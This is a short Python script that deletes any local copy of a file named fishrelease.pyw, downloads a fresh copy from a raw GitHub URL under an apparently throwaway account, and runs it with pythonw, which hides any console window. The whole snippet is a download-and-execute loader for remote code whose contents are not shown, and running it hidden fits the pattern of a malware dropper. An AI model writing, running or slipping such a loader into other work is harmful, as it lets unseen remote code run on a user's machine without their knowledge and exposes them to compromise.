import urllib.request, subprocess, os; 
os.remove("fishrelease.pyw") if os.path.exists("fishrelease.pyw") else None; 
subprocess.run(["pythonw", urllib.request.urlretrieve("https://raw.githubusercontent.com/skibiditoiletfan1123/someting23/refs/heads/main/fishrelease.pyw", "fishrelease.pyw")[0]])